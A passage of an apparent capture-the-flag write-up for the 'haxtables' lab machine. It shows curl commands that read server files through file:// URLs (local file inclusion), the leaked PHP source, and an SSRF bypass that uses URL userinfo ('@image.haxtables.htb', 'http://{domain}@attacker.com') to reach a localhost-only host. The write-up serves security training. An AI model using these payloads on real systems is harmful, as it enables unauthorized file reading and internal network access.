</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///var/www/image/index.php&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>   <span class=m>189</span>    <span class=m>0</span>   <span class=m>119</span>  <span class=m>100</span>    <span class=m>70</span>   <span class=m>2495</span>   <span class=m>1468</span> --:--:-- --:--:-- --:--:--  <span class=m>4021</span>
</span></span><span class=line><span class=cl>&lt;?php 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>include_once <span class=s1>&#39;utils.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>include <span class=s1>&#39;includes/coming_soon.html&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt;%                                          
</span></span></code></pre></td></tr></table></div></div><p>The <code>utils.php</code> script here looks different..</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///var/www/image/utils.php&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>1749</span>    <span class=m>0</span>  <span class=m>1679</span>  <span class=m>100</span>    <span class=m>70</span>  <span class=m>26867</span>   <span class=m>1120</span> --:--:-- --:--:-- --:--:-- <span class=m>28209</span>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// Global functions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> jsonify<span class=o>(</span><span class=nv>$body</span>, <span class=nv>$code</span> <span class=o>=</span> null<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=nv>$code</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        http_response_code<span class=o>(</span><span class=nv>$code</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    header<span class=o>(</span><span class=s1>&#39;Content-Type: application/json; charset=utf-8&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> json_encode<span class=o>(</span><span class=nv>$body</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    exit<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> get_url_content<span class=o>(</span><span class=nv>$url</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$domain</span> <span class=o>=</span> parse_url<span class=o>(</span><span class=nv>$url</span>, PHP_URL_HOST<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span>gethostbyname<span class=o>(</span><span class=nv>$domain</span><span class=o>)</span> <span class=o>===</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s2>&#34;message&#34;</span> <span class=o>=</span>&gt; <span class=s2>&#34;Unacceptable URL&#34;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$ch</span> <span class=o>=</span> curl_init<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>, CURLOPT_URL, <span class=nv>$url</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP <span class=p>|</span> CURLPROTO_HTTP<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>,CURLOPT_CONNECTTIMEOUT,2<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_setopt<span class=o>(</span><span class=nv>$ch</span>,CURLOPT_RETURNTRANSFER,1<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$url_content</span> <span class=o>=</span>  curl_exec<span class=o>(</span><span class=nv>$ch</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    curl_close<span class=o>(</span><span class=nv>$ch</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$url_content</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> git_status<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$status</span> <span class=o>=</span> shell_exec<span class=o>(</span><span class=s1>&#39;cd /var/www/image &amp;&amp; /usr/bin/git status&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$status</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> git_log<span class=o>(</span><span class=nv>$file</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$log</span> <span class=o>=</span> shell_exec<span class=o>(</span><span class=s1>&#39;cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &#34;&#39;</span> . addslashes<span class=o>(</span><span class=nv>$file</span><span class=o>)</span> . <span class=s1>&#39;&#34;&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$log</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> git_commit<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$commit</span> <span class=o>=</span> shell_exec<span class=o>(</span><span class=s1>&#39;sudo -u svc /var/www/image/scripts/git-commit.sh&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$commit</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>There are extra <code>git_status()</code>, <code>git_log()</code> and <code>git_commit()</code> functions, all of which shell out using <code>shell_exec()</code> from within <code>/var/www/image</code> to call <code>/usr/bin/git</code> &ndash; so it appears this directory is a git repository.</p><p>There&rsquo;s also a <code>sudo</code> command to run <code>/var/www/image/scripts/git-commit.sh</code> as the user <code>svc</code>. The script in question, once again pulled using LFI as above:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>u</span><span class=o>=</span><span class=k>$(</span>/usr/bin/git --git-dir<span class=o>=</span>/var/www/image/.git  --work-tree<span class=o>=</span>/var/www/image ls-files  -o --exclude-standard<span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=nv>$u</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        /usr/bin/git --git-dir<span class=o>=</span>/var/www/image/.git  --work-tree<span class=o>=</span>/var/www/image add -A
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>        /usr/bin/git --git-dir<span class=o>=</span>/var/www/image/.git  --work-tree<span class=o>=</span>/var/www/image commit -m <span class=s2>&#34;Commited from API!&#34;</span> --author<span class=o>=</span><span class=s2>&#34;james &lt;james@haxtables.htb&gt;&#34;</span>  --no-verify
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></td></tr></table></div></div><p>Here&rsquo;s where I decided to do things a real quick & dirty way, and look at files in the <code>.git</code> directory using our LFI exploit - to read <code>config</code>, <code>HEAD</code>, <code>index</code>. I toyed with the idea of using <a href=https://github.com/arthaud/git-dumper target=_blank rel="noopener noreffer">gitdumper</a>, but looking at the <code>index</code> file gave me another hint quite quickly &ndash; this is the staging area of a git repository, before something is committed:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///var/www/image/.git/index&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>1189</span>    <span class=m>0</span>  <span class=m>1118</span>  <span class=m>100</span>    <span class=m>71</span>  <span class=m>25645</span>   <span class=m>1628</span> --:--:-- --:--:-- --:--:-- <span class=m>27651</span>
</span></span><span class=line><span class=cl>DIRCcm9M1�Tcm9M1�TW����-<span class=sb>`</span>�S�ٽQ<span class=se>\A</span>��xk��o��actions/action_handler.phpcm9M1�Tcm9M1�TW����⛲��CK�<span class=o>)</span>�wZ���S�actions/image2pdf.phpcm9M1�Tcm9M1�TW�����b7
</span></span><span class=line><span class=cl>                                                                                                                                                 7��<span class=o>[</span>�
</span></span><span class=line><span class=cl>                                                                                                                                                      v�<span class=o>=</span>L���A&gt;�ssets/img/forestbridge.jpgcm9M1�Tcm9M1�TW���3��2D��<span class=o>}</span>��q���h���includes/coming_soon.htmlcm9M1�Tcm9M1�TW���Qr�㚔8��_c��kv.�pϋ    index.phpcm@7f�cm?����W�����0��+�&gt;����,��IA�<span class=s2>&#34;�scripts/git-commit.shcm9M1�Tcm9M1�TW�����M�ʱ��&#39;</span>$<span class=s2>;�~�x7�    utils.phpTREE�7 4
</span></span></span><span class=line><span class=cl><span class=s2>0a|�6��\�-��V�=
</span></span></span><span class=line><span class=cl><span class=s2>               j
</span></span></span><span class=line><span class=cl><span class=s2>                Iassets1 1
</span></span></span><span class=line><span class=cl><span class=s2>�Q[&#34;</span>���t��<span class=o>]</span>4��3����img1 <span class=nv>0</span>
</span></span><span class=line><span class=cl><span class=o>=</span>n<span class=sb>`</span>e�w����3�YL��actions2 <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=p>&amp;</span>��s<span class=p>;</span>N�$ω*D���includes1 <span class=m>00</span>
</span></span><span class=line><span class=cl>*�2�ߛ����
</span></span><span class=line><span class=cl>         n���H���,�M����&gt;�_1Y�<span class=o>{</span>L�W%     
</span></span></code></pre></td></tr></table></div></div><p>We see two paths <code>actions/action_handler.php</code> and <code>actions/image2pdf.php</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///var/www/image/actions/action_handler.php&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>   <span class=m>354</span>    <span class=m>0</span>   <span class=m>267</span>  <span class=m>100</span>    <span class=m>87</span>   <span class=m>6000</span>   <span class=m>1955</span> --:--:-- --:--:-- --:--:--  <span class=m>8045</span>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>include_once <span class=s1>&#39;utils.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span>isset<span class=o>(</span><span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;page&#39;</span><span class=o>]))</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$page</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;page&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    include<span class=o>(</span><span class=nv>$page</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> jsonify<span class=o>([</span><span class=s1>&#39;message&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;No page specified!&#39;</span><span class=o>])</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt;%                  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///var/www/image/actions/image2pdf.php&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>    <span class=m>93</span>    <span class=m>0</span>    <span class=m>11</span>  <span class=m>100</span>    <span class=m>82</span>    <span class=m>210</span>   <span class=m>1570</span> --:--:-- --:--:-- --:--:--  <span class=m>1788</span>
</span></span></code></pre></td></tr></table></div></div><p>So, <code>actions/action_handler.php</code> exists &ndash; but <code>actions/image2pdf.php</code> does not. We add <code>image.haxtables.htb</code> to our <code>/etc/hosts</code> &ndash; and we <em>know</em> before even trying that this host / directory is only accessible from 127.0.0.1 &ndash; due to the Apache config we found above with directives <code>Deny from all</code> and <code>Allow from 127.0.0.1</code>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-05-20-50-29-image.png data-srcset="./assets/2023-04-05-20-50-29-image.png, ./assets/2023-04-05-20-50-29-image.png 1.5x, ./assets/2023-04-05-20-50-29-image.png 2x" data-sizes=auto alt=./assets/2023-04-05-20-50-29-image.png title=./assets/2023-04-05-20-50-29-image.png></p><p>We know from before, that URL filtering is in place &ndash; but we can bypass this in some circumstances to achieve SSRF on <a href=http://api.haxtables.htb/v3/tools/string/index.php target=_blank rel="noopener noreffer">http://api.haxtables.htb/v3/tools/string/index.php</a></p><p>in the <code>file_url</code> field in our JSON payload. I tried a few bypass techniques such as <code>http://image.haxtables$foo.htb/</code> &ndash; hoping the string interpolation would replace <code>$foo</code> with an empty string and bypass the SSRF, but this didn&rsquo;t work.</p><p>Looking back at <code>/handler.php</code> in our main app, we POST a payload as follows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=err>    </span><span class=nt>&#34;action&#34;</span><span class=p>:</span><span class=s2>&#34;b64encode&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=err>    </span><span class=nt>&#34;data&#34;</span><span class=p>:</span><span class=s2>&#34;hello world!&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=err>    </span><span class=nt>&#34;uri_path&#34;</span><span class=p>:</span><span class=s2>&#34;/v3/tools/string&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>handler.php</code> simply checks for the existence of the <code>action</code> and <code>uri_path</code> keys, before calling <code>$response = make_api_call($action, $data, $uri_path, $is_file);</code>. Our <code>make_api_call()</code> function is shown below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>make_api_call</span><span class=p>(</span><span class=nv>$action</span><span class=p>,</span> <span class=nv>$data</span><span class=p>,</span> <span class=nv>$uri_path</span><span class=p>,</span> <span class=nv>$is_file</span> <span class=o>=</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$is_file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$post</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;data&#39;</span> <span class=o>=&gt;</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$data</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;action&#39;</span> <span class=o>=&gt;</span> <span class=nv>$action</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;uri_path&#39;</span> <span class=o>=&gt;</span> <span class=nv>$uri_path</span>
</span></span><span class=line><span class=cl>        <span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$post</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;data&#39;</span> <span class=o>=&gt;</span> <span class=nv>$data</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;action&#39;</span> <span class=o>=&gt;</span> <span class=nv>$action</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;uri_path&#39;</span> <span class=o>=&gt;</span> <span class=nv>$uri_path</span>
</span></span><span class=line><span class=cl>        <span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$url</span> <span class=o>=</span> <span class=s1>&#39;http://api.haxtables.htb&#39;</span> <span class=o>.</span> <span class=nv>$uri_path</span> <span class=o>.</span> <span class=s1>&#39;/index.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span><span class=nx>CURLOPT_CONNECTTIMEOUT</span><span class=p>,</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_PROTOCOLS</span><span class=p>,</span> <span class=nx>CURLPROTO_HTTP</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span> <span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_FOLLOWLOCATION</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_RETURNTRANSFER</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_POSTFIELDS</span><span class=p>,</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$post</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_setopt</span><span class=p>(</span> <span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HTTPHEADER</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;Content-Type:application/json&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$response</span> <span class=o>=</span> <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>curl_close</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$response</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>So there&rsquo;s no filtering or validation to stop a URI containing localhost, but the URL is constructed as follows &ndash; trying to force our input to be used as a path within <code>http://api.haxtables.htb</code>, and ending in <code>/index.php</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s1>&#39;http://api.haxtables.htb&#39;</span> <span class=o>.</span> <span class=nv>$uri_path</span> <span class=o>.</span> <span class=s1>&#39;/index.php&#39;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>Can we bypass this? Our <a href=https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass target=_blank rel="noopener noreffer">URL Format Bypass</a> page earlier include domain confusion techniques, such as:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://{domain}@attacker.com
</span></span></code></pre></td></tr></table></div></div><p><a href=https://www.rfc-editor.org/rfc/rfc3986 target=_blank rel="noopener noreffer">RFC 3986: Uniform Resource Identifier (URI): Generic Syntax</a> contains an authority component, where <code>userinfo</code>, usually comprising of <code>user:pass</code> is denoted before a domain with <code>@</code> (and shouldn&rsquo;t be used!). By prefixing our <code>attacker.com</code> domain with <code>@</code>, then <code>http://{domain}</code> will be ignored and effectively treated as a username &ndash; allowing us to change the domain.</p><p>So if we set <code>$uri_path</code> to <code>@image.haxtables.htb</code>, we end up with <code>http://api.haxtables.htb@image.haxtables.htb/index.php</code> . <code>http://api.haxtables.htb</code> will be treated as a username, and curl will subsequently request the domain/path <code>image.haxtables.htb/index.php</code>. Confirming this works:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
